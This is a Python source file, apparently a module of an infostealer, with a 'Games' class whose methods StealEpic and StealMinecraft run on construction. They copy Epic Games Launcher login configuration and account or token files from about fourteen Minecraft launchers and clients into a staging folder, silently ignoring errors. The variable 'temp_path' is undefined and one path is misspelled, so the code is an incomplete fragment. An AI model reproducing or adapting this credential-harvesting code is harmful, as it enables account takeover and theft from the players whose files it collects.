import os
import shutil


class Games:
    def __init__(self):
        self.StealEpic()
        self.StealMinecraft()
        
                        
    def GetLnkFromStartMenu(self, app: str) -> list[str]:
        shortcutPaths = []
        startMenuPaths = [
            os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs"),
            os.path.join("C:\\", "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs")
        ]
        for startMenuPath in startMenuPaths:
            for root, _, files in os.walk(startMenuPath):
                for file in files:
                    if file.lower() == "%s.lnk" % app.lower():
                        shortcutPaths.append(os.path.join(root, file))       
        return shortcutPaths
    

    def StealEpic(self) -> None:
        if True:
            saveToPath = os.path.join(temp_path, "Games", "Epic")
            epicPath = os.path.join(os.getenv("localappdata"), "EpicGamesLauncher", "Saved", "Config", "Windows")
            if os.path.isdir(epicPath):
                loginFile = os.path.join(epicPath, "GameUserSettings.ini")
                if os.path.isfile(loginFile):
                    with open(loginFile) as file:
                        contents = file.read()
                    if "[RememberMe]" in contents:
                        try:
                            os.makedirs(saveToPath, exist_ok=True)
                            for file in os.listdir(epicPath):
                                if os.path.isfile(os.path.join(epicPath, file)):
                                    shutil.copy(os.path.join(epicPath, file), os.path.join(saveToPath, file))
                            shutil.copytree(epicPath, saveToPath, dirs_exist_ok=True)
                        except Exception:
                            pass

    def StealMinecraft(self) -> None:
        saveToPath = os.path.join(temp_path, "Games", "Minecraft")
        userProfile = os.getenv("userprofile")
        roaming = os.getenv("appdata")
        minecraftPaths = {
             "Intent" : os.path.join(userProfile, "intentlauncher", "launcherconfig"),
             "Lunar" : os.path.join(userProfile, ".lunarclient", "settings", "game", "accounts.json"),
             "TLauncher" : os.path.join(roaming, ".minecraft", "TlauncherProfiles.json"),
             "Feather" : os.path.join(roaming, ".feather", "accounts.json"),
             "Meteor" : os.path.join(roaming, ".minecraft", "meteor-client", "accounts.nbt"),
             "Impact" : os.path.join(roaming, ".minecraft", "Impact", "alts.json"),
             "Novoline" : os.path.join(roaming, ".minectaft", "Novoline", "alts.novo"),
             "CheatBreakers" : os.path.join(roaming, ".minecraft", "cheatbreaker_accounts.json"),
             "Microsoft Store" : os.path.join(roaming, ".minecraft", "launcher_accounts_microsoft_store.json"),
             "Rise" : os.path.join(roaming, ".minecraft", "Rise", "alts.txt"),
             "Rise (Intent)" : os.path.join(userProfile, "intentlauncher", "Rise", "alts.txt"),
             "Paladium" : os.path.join(roaming, "paladium-group", "accounts.json"),
             "PolyMC" : os.path.join(roaming, "PolyMC", "accounts.json"),
             "Badlion" : os.path.join(roaming, "Badlion Client", "accounts.json"),
        }

        for name, path in minecraftPaths.items():
            if os.path.isfile(path):
                try:
                    os.makedirs(os.path.join(saveToPath, name), exist_ok= True)
                    shutil.copy(path, os.path.join(saveToPath, name, os.path.basename(path)))
                except Exception:
                    continue